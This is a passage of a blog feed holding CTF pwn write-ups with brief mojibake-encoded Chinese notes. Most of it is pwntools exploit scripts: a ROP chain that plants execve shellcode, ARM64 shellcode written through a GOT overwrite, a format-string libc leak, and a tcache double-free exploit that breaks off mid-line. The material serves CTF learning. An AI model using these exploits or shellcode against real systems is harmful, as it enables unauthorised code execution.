class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line"><span class="built_in">format</span> = <span class="number">0x000000000040088B</span> <span class="comment"># %s</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400811</span></span><br><span class="line"><span class="comment"># scanf(&quot;%s&quot;,&amp;buf)</span></span><br><span class="line">pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">pay += p64(pop_rdi)</span><br><span class="line">pay += p64(<span class="built_in">format</span>)</span><br><span class="line">pay += p64(pop_rsi_r15)</span><br><span class="line">pay += p64(elf.bss()+<span class="number">0x250</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(elf.plt[<span class="string">&#x27;__isoc99_scanf&#x27;</span>])</span><br><span class="line">pay += p64(elf.bss()+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;Come On&#x27;</span>,pay)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sc = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment"># sc=asm(shellcraft.sh())</span></span><br><span class="line">sl(sc)</span><br><span class="line">sl(<span class="string">&#x27;exec /bin/sh 1&gt;&amp;0&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618993139811-95019e88-fa9a-479f-92a6-363d6e16c1dd.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary=<span class="string">&#x27;./lucky&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;lucky guy&#x27;</span>,<span class="string">&#x27;wendy&#x27;</span>)</span><br><span class="line">libc.srand((libc.time(<span class="number">0</span>) / <span class="number">0xA</span>)+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(&#x27;number:&#x27;, str(libc.rand()))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    sla(<span class="string">&#x27;number:&#x27;</span>,<span class="built_in">str</span>(libc.rand()))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;



&lt;p&gt;åˆ’æ°´éšè®°&lt;/p&gt;
&lt;!--more--&gt;

&lt;h3 id=&quot;4-8&quot;&gt;&lt;a href=&quot;#4-8&quot; class=&quot;headerlink&quot; title=&quot;4.8&quot;&gt;&lt;/a&gt;4.8&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;é€šè¿‡ä¸€å­—èŠ‚ä¿®æ”¹m</summary>
      
    
    
    
    
    <category term="others" scheme="https://brooke-hub.github.io/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>hws2020</title>
    <link href="https://brooke-hub.github.io/2021/02/05/hws2020/"/>
    <id>https://brooke-hub.github.io/2021/02/05/hws2020/</id>
    <published>2021-02-05T03:58:59.000Z</published>
    <updated>2021-06-05T08:56:46.996Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°"><a href="#hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°" class="headerlink" title="hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°"></a>hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°</h1><p>æ‹–å»¶åŠå¹´</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h3><h5 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h5><p>ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œå…ˆæŠŠfread@gotæ”¹å†™ä¸ºmainä¸­ä¸€ä¸ªä»<code>read(0, v15, 8uLL);</code>å¼€å§‹çš„åœ°å€ï¼Œå®ç°å¤šæ¬¡ä»»æ„å†™</p><p>å‘dataæ®µå†™scï¼Œå†æ”¹å†™fread@gotä¸ºdataåœ°å€ï¼Œæ‰§è¡Œåˆ°<code>fread(v12, size, 1uLL, stream);</code>è§¦å‘</p><span id="more"></span><p>excerpt_link: more</p><p><img src="/2021/02/05/hws2020/image-20210422104524430.png" alt="image-20210422104524430"></p><p><a href="https://www.exploit-db.com/shellcodes/47048">arm64 shellcode</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2&quot;</span></span><br><span class="line">sc2 = <span class="string">&quot;\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">sc3 = <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa&quot;</span></span><br><span class="line">sc4 = <span class="string">&quot;\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">sc5 = <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr,content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fread_got = <span class="number">0x412060</span></span><br><span class="line">    main_read = <span class="number">0x0000000000400BE4</span></span><br><span class="line">    write_to(fread_got,p64(main_read))</span><br><span class="line"></span><br><span class="line">    write_to(<span class="number">0x0000000000412080</span>, sc1)</span><br><span class="line">    write_to(<span class="number">0x0000000000412088</span>, sc2)</span><br><span class="line">    write_to(<span class="number">0x0000000000412090</span>, sc3)</span><br><span class="line">    write_to(<span class="number">0x0000000000412098</span>, sc4)</span><br><span class="line">    write_to(<span class="number">0x00000000004120a0</span>, sc5)</span><br><span class="line"></span><br><span class="line">    write_to(fread_got,p64(<span class="number">0x0000000000412080</span>))</span><br><span class="line">    ti()</span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æ³„éœ²åŸºåœ°å€ï¼Œæ”¹gotè¡¨ä¸ºog"><a href="#æ³„éœ²åŸºåœ°å€ï¼Œæ”¹gotè¡¨ä¸ºog" class="headerlink" title="æ³„éœ²åŸºåœ°å€ï¼Œæ”¹gotè¡¨ä¸ºog"></a>æ³„éœ²åŸºåœ°å€ï¼Œæ”¹gotè¡¨ä¸ºog</h5><p><a href="https://blog.csdn.net/qq_39869547/article/details/105255683">qemu arm è°ƒè¯•</a></p><p>è¿›å…¥gdbå…ˆåŠ«æŒåˆ°åŠ è½½å™¨ï¼Œç¨‹åºè¿˜æ²¡è¢«åŠ è½½</p><p>no pie æ‰€ä»¥ç›´æ¥ä¸‹æ–­ç‚¹ç­‰å¾…æ•è·å°±è¡Œäº†</p><p>æ”¹å†™atoi@gotä¸ºprintf@pltï¼Œnumå†™å…¥fmtï¼Œä¹‹å <code>size = atoi(num);</code>æ³„æ¼æ ˆå†…å®¹</p><p><img src="/2021/02/05/hws2020/image-20210422121323728.png" alt="image-20210422121323728"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;-g&quot;,&quot;1241&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendlineafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">n</span>):</span> <span class="keyword">return</span> sh.recv(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ti</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">name, addr</span>):</span> <span class="keyword">return</span> log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr, content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>, content)</span><br><span class="line">    <span class="comment"># sla(&#x27;bye&#x27;, &#x27;1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    atoi_got = <span class="number">0x412020</span></span><br><span class="line">    printf_plt = <span class="number">0x00000000004008B0</span></span><br><span class="line">    write_to(atoi_got,p64(printf_plt))</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>,<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    base = <span class="built_in">int</span>(sh.recv(<span class="number">10</span>),<span class="number">16</span>) - <span class="number">0x206e0</span></span><br><span class="line">    leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">    ti()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br></pre></td></tr></table></figure><p><img src="/2021/02/05/hws2020/image-20210422121554233.png" alt="image-20210422121554233"></p><p>å…ˆæœ¬åœ°è°ƒè¯•æ‰¾å¥½fmtåç§» 9</p><p>å¾—åˆ°æœ¬æœºåŸºåœ°å€0x400084a000</p><p><img src="/2021/02/05/hws2020/image-20210422190207581.png" alt="image-20210422190207581"></p><p><img src="/2021/02/05/hws2020/image-20210422191204668.png" alt="image-20210422191204668"></p><p>ä½†æ˜¯è¿™ä¸ªæœ¬åœ°æ²¡æ‰“é€š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># import sys</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binary=&#x27;./emarm&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(binary)</span></span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;-g&quot;,&quot;1241&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendlineafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">n</span>):</span> <span class="keyword">return</span> sh.recv(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ti</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">name, addr</span>):</span> <span class="keyword">return</span> log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr, content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>, content)</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fread_got = <span class="number">0x412060</span></span><br><span class="line">    libc_base = <span class="number">0x400084a000</span></span><br><span class="line">    og = [<span class="number">0x3f150</span>, <span class="number">0x3f174</span>, <span class="number">0x3f198</span>, <span class="number">0x63e80</span>]</span><br><span class="line">    write_to(fread_got, p64(og[<span class="number">3</span>]+libc_base))</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br></pre></td></tr></table></figure><h3 id="ememarm"><a href="#ememarm" class="headerlink" title="ememarm"></a>ememarm</h3><p><img src="/2021/02/05/hws2020/image-20210422212601991.png" alt="image-20210422212601991"></p><p><img src="/2021/02/05/hws2020/image-20210422203848683.png" alt="image-20210422203848683"></p><p>æ”»å‡»chunk5[3]å’Œchunk4[3]ï¼Œeditä¹‹åä¼šfree chunk[3]æŒ‡å‘çš„chunkï¼Œæ‰€ä»¥fake chunkè¢«double freeäº†</p><p><img src="/2021/02/05/hws2020/image-20210422213354259.png" alt="image-20210422213354259"></p><p>çœ‹ä¸åˆ°binå¥½éº»çƒ¦</p><p>tcachebin[0x30]-&gt;fakechunk-&gt;fakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./ememarm&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">cx,cy,num</span>):</span> <span class="comment">#size 0x30</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&#x27;cx:&#x27;</span>,cx)</span><br><span class="line">    sa(<span class="string">&#x27;cy&#x27;</span>,cy)</span><br><span class="line">    sla(<span class="string">&#x27;delete?&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(num))</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">cx, cy, num</span>):</span> <span class="comment"># size 0x40</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sa(<span class="string">&#x27;cx:&#x27;</span>, cx)</span><br><span class="line">    sa(<span class="string">&#x27;cy&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;note  ~~&#x27;</span>)</span><br><span class="line">    bss = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    leak(<span class="string">&#x27;bss&#x27;</span>,bss)</span><br><span class="line"></span><br><span class="line">    sl(<span class="string">&#x27;WENDY&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span 